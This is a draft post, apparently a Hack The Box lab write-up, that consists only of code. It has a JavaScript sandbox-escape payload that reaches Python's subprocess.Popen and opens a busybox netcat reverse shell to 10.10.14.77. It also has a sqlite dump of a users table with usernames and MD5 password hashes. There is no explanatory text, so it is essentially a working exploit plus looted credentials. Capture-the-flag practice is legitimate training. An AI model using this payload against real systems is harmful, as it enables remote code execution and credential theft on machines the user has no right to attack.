+++
title = 'Htb Code2'
date = 2026-03-05T13:30:21+01:00
draft = true
[params]
  difficulty = "easy"
  description = ""

+++

```javascript
let cmd = "busybox nc 10.10.14.77 2122 -e /bin/sh";
let hacked, bymarve, n11;
let getattr, obj;

hacked = Object.getOwnPropertyNames({});
bymarve = hacked.__getattribute__;
n11 = bymarve("__getattribute__");
obj = n11("__class__").__base__;
getattr = obj.__getattribute__;

function findpopen(o) {
  let result;
  for (let i in o.__subclasses__()) {
    let item = o.__subclasses__()[i];
    if (item.__module__ == "subprocess" && item.__name__ == "Popen") {
      return item;
    }
    if (item.__name__ != "type" && (result = findpopen(item))) {
      return result;
    }
  }
}

n11 = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate();
console.log(n11);
n11;
```

```text
sqlite3 instance/users.db .dump
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE user (
 id INTEGER NOT NULL,
 username VARCHAR(80) NOT NULL,
 password_hash VARCHAR(128) NOT NULL,
 PRIMARY KEY (id),
 UNIQUE (username)
);
INSERT INTO user VALUES(1,'marco','649c9d65a206a75f5abe509fe128bce5');
INSERT INTO user VALUES(2,'app','a97588c0e2fa3a024876339e27aeb42e');
INSERT INTO user VALUES(3,'dings','996f56db1b3c951d14f9b45b12a97be1');
CREATE TABLE code_snippet (
 id INTEGER NOT NULL,
 user_id INTEGER NOT NULL,
 code TEXT NOT NULL,
 PRIMARY KEY (id),
 FOREIGN KEY(user_id) REFERENCES user (id)
);
COMMIT;
```
